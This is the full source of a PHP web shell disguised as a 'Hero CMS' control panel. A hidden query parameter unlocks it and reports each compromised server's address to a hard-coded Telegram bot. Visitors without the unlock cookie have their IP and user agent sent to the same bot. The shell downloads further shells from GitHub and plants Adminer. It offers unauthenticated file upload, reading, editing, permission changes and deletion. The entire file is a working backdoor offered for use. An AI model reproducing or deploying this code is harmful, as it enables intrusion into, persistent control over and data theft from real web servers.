<?php

set_time_limit(0);
error_reporting(0);

$app_verion = 'v3';

if($_GET['myhero'] == 'ghasem' ){
    setcookie("oked", "yeah", time() + (86400 * 30) ); // 86400 = 1 day
    file_get_contents("https://api.telegram.org/bot2107069075:AAFwyTBWxdguMFSpbfVDQS9pl5WK532yYx0/sendMessage?chat_id=98730055&text=5h11 0pen: %0A ".urlencode($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']));
}

if (isset($_GET['path'])){
    $path = $_GET['path'];
}else{
    $path = getcwd();
}
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);


if(isset($_POST['adminername']) ){
    if(strlen($_POST['adminername'])<1){
        echo "wrong name";
        return;
    }

    $opts = array('http' =>
        array(
            'header'  => 'User-agent: PHP',
        )
    );
    $HeroLastRelease = @json_decode(file_get_contents("https://api.github.com/repos/Abalfazl-Hackers/Hero-Shell/releases/latest", false, stream_context_create($opts) ));    
    $HerpLastRelease_url = $HeroLastRelease->assets[0]->browser_download_url;    
    
    file_put_contents($path."/".$_POST['adminername'].".php",file_get_contents($HerpLastRelease_url));
    $parts = explode('/', $_SERVER["SCRIPT_NAME"]);
    echo str_replace($parts[count($parts) - 1],$_POST['adminername'],$_SERVER['SERVER_NAME'].$path."/").".php";
    return;
}



if(isset($_POST['savebackup']) ){
    if(strlen($_POST['savebackup'])<1){
        echo "wrong name";
        return;
    }
    file_put_contents($path."/".$_POST['savebackup'].".php",file_get_contents("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php"));
    $parts = explode('/', $_SERVER["SCRIPT_NAME"]);
    echo str_replace($parts[count($parts) - 1],$_POST['savebackup'],$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']).$_POST['savebackup'].".php";
    return;
}




if (!isset($_COOKIE["oked"])){
    file_get_contents("https://api.telegram.org/bot2107069075:AAFwyTBWxdguMFSpbfVDQS9pl5WK532yYx0/sendMessage?chat_id=98730055&text=Wr0ng+Addre55+from:+".$_SERVER['REMOTE_ADDR']." %0A Agent:+".$_SERVER['HTTP_USER_AGENT']." %0A ".urlencode($_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']));
    header('Location: http://' . $_SERVER['HTTP_HOST']);
}


if (get_magic_quotes_gpc()){
    foreach ($_POST as $key => $value)
    {
        $_POST[$key] = stripslashes($value);
    }
}

echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>Hero CMS CONTROL PANEL '.$app_verion.'</title>

<style>


body{
    font-family: "cursive","Roboto", cursive;
    background-color:black;
    color:white;
    background: url("http://irhpentest.ir/mH5/hero.jpg") no-repeat #000 right top fixed;
    filter: brightness(0.8);
    background-size:contain;
}

#content .first{
    background-color:darkolivegreen;
}

table {
    border: 3px darkolivegreen double;
    max-width: 1313px;
    width: 100%;
    background-color: #ff01;
}

#content tbody:hover tr {
    filter: blur(0.7px) grayscale(1) sepia(0.3);
    transition:313ms;
}
#content tbody tr:hover {
    filter: blur(0px) grayscale(0) sepia(0);
    transition:110ms;
}

H1,a{
    font-family: "Rye", "BLACK", cursive;
}

a{
    color:darkolivegreen;
    text-decoration: none;
}

a:hover{
    color:white;
    text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea{
    border: 1px #fff solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
textarea {
	max-width: 1313px;
	width: 100%;
}
button,input[value="Save"] {
    background-color: darkolivegreen;
    padding: 6px 20px;
    display: inline-block;
    margin: 8px 8px 14px 14px;
    border-radius: 0px;
    cursor: alias;
    border: 1px solid forestgreen;
    color: wheat;
    transition:110ms;
}
button:hover {
    background-color: forestgreen;
    color: white;
    transition:313ms;
}
</style>
</HEAD>
<BODY>
<table border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<td style="padding:14px;">

<h2>Hero CMS Panel <b>'.$app_verion.'</b></h2>';









echo "<small>SERVER NAME</small>: <b style=' color: lightgreen; '>".$_SERVER['SERVER_NAME']."</b><br>";

$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$_SERVER['SERVER_ADDR']));    
if($ip_data && $ip_data->geoplugin_countryName != null){
    $result_country = strtolower($ip_data->geoplugin_countryCode);
    $result_city = $ip_data->geoplugin_city;
    $geoplugin_countryName = $ip_data->geoplugin_countryName;
    $loc_fr_ip = "<img style='width: 20px;' src='https://flagicons.lipis.dev/flags/4x3/$result_country.svg' >   $geoplugin_countryName   $result_city";
}

echo"<small>Server IP</small>: <b style=' color: lightgreen; '>". $_SERVER['SERVER_ADDR']."   $loc_fr_ip  </b><br>";
echo "<small>HOST</small>: <b style=' color: lightgreen; '>".$_SERVER['HTTP_HOST']."</b><br>";
echo"<small>USER AGENT</small>: <b style=' color: lightgreen; '>". $_SERVER['HTTP_USER_AGENT']."</b><br>";

echo"<small>SOFTWARE </small>: <b style=' color: lightgreen; '>". @getenv('SERVER_SOFTWARE')."</b> </br>";

echo "<small>Disabled Functions</small>: <b style=' color: lightgreen; '> ";
if(@ini_get('disable_functions')){
    echo @ini_get('disable_functions')."</b><br>";
}else{
    echo " All Functions Enable"."</b><br>";
}



echo "Functions:  ";
if(function_exists('ssh2_connect')){
    $ssh2=" on";
}else{
    $ssh2=" off";
}
echo "<small>SSH2</small>: <b style=' color: lightgreen; '>". $ssh2."</b> | ";



if(function_exists('curl_version')){
    $curl = " on";
}else{
    $curl = " off";
}
echo "<small>CURL</small>: <b style=' color: lightgreen; '>". $curl."</b> | ";


if(function_exists('mysql_get_client_info')||class_exists('mysqli')){
    $mysql = " on";
}else{
    $mysql = " off";
}
echo "<small>MySQL</small>: <b style=' color: lightgreen; '>". $mysql."</b> | ";


if(function_exists('mssql_connect')){
    $mssql = " on";
}else{
    $mssql = " off";
}
echo "<small>MSSQL</small>: <b style=' color: lightgreen; '>". $mssql."</b> | ";


if(function_exists('pg_connect')){
    $pg = " on";
}else{
    $pg = " off";
}
echo "<small>PG</small>: <b style=' color: lightgreen; '>". $pg."</b> | ";


if(function_exists('oci_connect')){
    $or = " on";
}else{
    $or = " off";
}
echo "<small>OCI Connect</small>: <b style=' color: lightgreen; '>". $or."</b> | ";



if(@ini_get('safe_mode')){
    $safe_modes = " on";
}else{
    $safe_modes = " off";
}
echo "<small>Safe Mode</small>: <b style=' color: lightgreen; '>". $safe_modes."</b> | ";



$quotes = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($quotes == "1" or $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
echo"<small>Magic Quotes GPC</small>: <b style=' color: lightgreen; '>". $magic."</b> ";















echo '
</td>
</tr>
<tr><td>Current Path : ';


foreach ($paths as $id => $pat){
    if ($pat == '' && $id == 0)
    {
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?path=';
    for ($i = 0;$i <= $id;$i++)
    {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';
if (isset($_FILES['file'])){
    $tmpnme=$_FILES['file']['tmp_name'];
	if (copy($tmpnme, $path . '/' . $_FILES['file']['name'])){
        echo '<font color="green">File Upload Done ~_^ .</font><br />';
    }else{
        echo '<font color="red">File Upload Error ~_~.</font><br />';
    }
}


?>

<button type="button" onclick="insertAdminerHereFunc()">Add Adminer</button>
<button type="button" onclick="BackupScriptFunc()">Add Backup Script</button>


<?php

echo '<form enctype="multipart/form-data" method="POST">
Upload File :<input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if (isset($_GET['filesrc'])){
    echo '</table><br />';
    echo ('<center><textarea cols=140 rows=37 name="src">' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</textarea><br />');
}elseif (isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><center><br />';
    if ($_POST['opt'] == 'chmod')
    {
        if (isset($_POST['perm']))
        {
            if (chmod($_POST['path'], $_POST['perm']))
            {
                echo '<font color="green">Change Permission Done.</font><br />';
            }
            else
            {
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])) , -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Save" />
</form>';
    }
    elseif ($_POST['opt'] == 'rename')
    {
        if (isset($_POST['newname']))
        {
            if (rename($_POST['path'], $path . '/' . $_POST['newname']))
            {
                echo '<font color="green">Change Name Done.</font><br />';
            }
            else
            {
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Save" />
</form>';
    }
    elseif ($_POST['opt'] == 'edit')
    {
        if (isset($_POST['src']))
        {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src']))
            {
                echo '<font color="green">Edit File Done ~_^.</font><br />';
            }
            else
            {
                echo '<font color="red">Edit File Error ~_~.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
<textarea cols=140 rows=35 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete')
    {
        if ($_POST['type'] == 'dir')
        {
            if (rmdir($_POST['path']))
            {
                echo '<font color="green">Delete Dir Done.</font><br />';
            }
            else
            {
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        }
        elseif ($_POST['type'] == 'file')
        {
            if (unlink($_POST['path']))
            {
                echo '<font color="green">Delete File Done.</font><br />';
            }
            else
            {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

    foreach ($scandir as $dir)
    {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
        if (is_writable("$path/$dir")) echo '<font color="green">';
        elseif (!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

        echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
    <option value=\"\"></option>
    <option value=\"delete\">Delete</option>
    <option value=\"chmod\">Chmod</option>
    <option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach ($scandir as $file)
    {
        if (!is_file("$path/$file")) continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024)
        {
            $size = round($size / 1024, 2) . ' MB';
        }
        else
        {
            $size = $size . ' KB';
        }

        echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>" . $size . "</center></td>
<td><center>";
        if (is_writable("$path/$file")) echo '<font color="green">';
        elseif (!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
    <option value=\"\"></option>
    <option value=\"delete\">Delete</option>
    <option value=\"chmod\">Chmod</option>
    <option value=\"rename\">Rename</option>
    <option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
    }
    echo '
      <tfoot>
        <tr style="border-top:1px solid olive">
          <td colspan="5" style="color: olive;padding: 14px 14px 6px 14px;font-size:72%;">Powered by Abalfazl Hackers</td>
        </tr>
      </tfoot>
    </table></div>
    
<script>
function insertAdminerHereFunc(){
    let adminername = prompt("Enter Adminer Name: ");
    
    
    var http = new XMLHttpRequest();
    var url = "";
    var params = "adminername="+adminername;
    http.open("POST", url, true);
    
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    
    http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState == 4 && http.status == 200) {
            alert(http.responseText);
        }
    }
    http.send(params);
    
}


function BackupScriptFunc(){
    let adminername = prompt("Enter New Script Name: ");
    
    
    var http = new XMLHttpRequest();
    var url = "";
    var params = "adminername="+adminername;
    http.open("POST", url, true);
    
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    
    http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState == 4 && http.status == 200) {
            alert(http.responseText);
        }
    }
    http.send(params);
    
}
</script>
</html>';
}


function perms($file)
{
    $perms = fileperms($file);

    if (($perms & 0xC000) == 0xC000)
    {
        // Socket
        $info = 's';
    }
    elseif (($perms & 0xA000) == 0xA000)
    {
        // Symbolic Link
        $info = 'l';
    }
    elseif (($perms & 0x8000) == 0x8000)
    {
        // Regular
        $info = '-';
    }
    elseif (($perms & 0x6000) == 0x6000)
    {
        // Block special
        $info = 'b';
    }
    elseif (($perms & 0x4000) == 0x4000)
    {
        // Directory
        $info = 'd';
    }
    elseif (($perms & 0x2000) == 0x2000)
    {
        // Character special
        $info = 'c';
    }
    elseif (($perms & 0x1000) == 0x1000)
    {
        // FIFO pipe
        $info = 'p';
    }
    else
    {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}


?>